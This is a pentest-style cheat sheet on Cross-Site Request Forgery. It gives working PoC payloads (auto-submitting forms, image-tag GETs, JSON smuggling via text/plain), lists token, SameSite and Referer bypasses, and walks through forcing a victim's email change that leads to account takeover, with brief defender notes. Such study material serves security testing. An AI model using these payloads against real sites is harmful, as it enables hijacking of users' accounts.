# CSRF — Cross-Site Request Forgery

Force a logged-in victim's browser to send a **state-changing request** to an app they're
authenticated to. The browser **automatically attaches the session cookie**, so the app runs the
action as the victim — change their email/password, transfer funds, add an admin — without the
attacker ever seeing the response.

Replace placeholders (`<...>`) with your own values: `<target>`, `<your-server>`.

---
---

# PART 1 — OVERVIEW (at a glance)

## The three conditions (all must hold)

| # | Condition | If missing → no CSRF |
|---|-----------|----------------------|
| 1 | A **state-changing** action (POST/PUT/DELETE, or GET that changes state) | read-only = nothing to forge |
| 2 | Session handled by a **cookie sent automatically** | header/token-in-body auth defeats it |
| 3 | **No unpredictable token** the attacker can't guess/read | a valid anti-CSRF token blocks it |

## The three defenses you must defeat

- **Anti-CSRF token** — a random value per form/session the request must echo back.
- **SameSite cookie** — `Lax`/`Strict` stops the cookie riding cross-site requests.
- **Origin/Referer check** — server rejects requests from another site.

## Go-to PoC (auto-submitting form)

```html
<form action="http://<target>/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

## Defender notes (for the report)

- **SameSite=Lax** (default) or **Strict** on session cookies — the modern baseline.
- **Anti-CSRF tokens** tied to the session, on every state-changing request.
- Verify **Origin**/**Referer**; require re-auth for sensitive actions (password, email).

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Find a CSRF-able action

Look for state-changing requests that rely only on the cookie: change email/password, update
profile, add user/role, transfer, delete, toggle settings. In Burp, check the request:

```
□ Does it change state?                         (POST /account/email …)
□ Is the session only a cookie?                 (Cookie: session=…  and nothing else)
□ Is there a token param? is it actually checked? (remove it and resend)
```

## Step 2 — Build the PoC

**GET** (if a GET changes state) — a single image tag fires it silently:

```html
<img src="http://<target>/account/delete?id=5">
```

**POST** — an auto-submitting hidden form (works cross-site; sends the cookie):

```html
<form action="http://<target>/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

Host it on `http://<your-server>/poc.html`, get the victim to open it while logged in.

```
what happens: the victim's browser POSTs with their session cookie → email changed to yours
              → password-reset to you → account takeover
```

## Step 3 — Token bypasses

The token is the usual blocker — try, in order:

```
1. Remove the token param entirely            → often "not present" = not validated
2. Send an empty token (name present, value="")
3. Use YOUR OWN valid token in the victim's request  → if token isn't tied to their session
4. Reuse an old/static token                  → if it doesn't rotate
5. Change method POST→GET                      → token sometimes only checked on POST
6. Predict/leak it — is it in the page/URL/a cookie you can read?
```

## Step 4 — SameSite bypasses

```
SameSite=Lax → still allows top-level GET navigation:
   <a href> / window.open / a GET form  (not background POST)
   so: turn the action into a GET, or use a full-page navigation
On-site gadget → find any XSS/open-redirect on the target's own origin (SameSite is same-SITE)
Sibling subdomain → a request from sub.target.com counts as same-site
Method override → POST with ?_method=PUT if the framework honours it
```

## Step 5 — JSON / custom-header endpoints

APIs that require `Content-Type: application/json` or a custom header are usually CSRF-safe
(forms can't set those). Try:

```
- Change Content-Type to text/plain and send raw JSON as the form body (some parsers accept it)
- If it also has a token/Origin check, CSRF is likely dead — pivot to XSS/CORS instead
```

---
---

# PART 3 — PAYLOAD ARSENAL

## PoC templates

```html
<!-- GET via image (silent) -->
<img src="http://<target>/action?x=1">

<!-- POST auto-submit form -->
<form action="http://<target>/action" method="POST">
  <input type="hidden" name="key" value="value">
</form><script>document.forms[0].submit()</script>

<!-- POST with text/plain to smuggle JSON -->
<form action="http://<target>/api/x" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form><script>document.forms[0].submit()</script>

<!-- fetch (only lands if CORS/SameSite allow; keeps cookies) -->
<script>fetch('http://<target>/action',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'key=value'})</script>
```

## Bypass reference

| Blocker | Try |
|---------|-----|
| Anti-CSRF token | remove · empty · your own token · reused · POST→GET · leaked in page |
| `SameSite=Lax` | top-level GET nav · make it a GET · on-site gadget · sibling subdomain |
| Origin/Referer | strip Referer (`<meta name=referrer content=no-referrer>`) · hope for null allow |
| JSON only | `enctype=text/plain` JSON smuggle · missing `Content-Type` check |

## Tools

```
Burp → right-click request → Engagement tools → Generate CSRF PoC (Pro)
Burp Repeater → remove the token and resend to confirm it isn't validated
```

---

**Key idea:** CSRF abuses **ambient authority** — the browser attaches the session cookie to
*any* request to the target, including ones triggered from the attacker's page. If the app trusts
that cookie alone for a state-changing action, you forge the action as the victim. It dies the
moment the app requires something the attacker can't supply cross-site: an unpredictable token, a
`SameSite` cookie, or an Origin check. Fix: `SameSite` + anti-CSRF tokens.
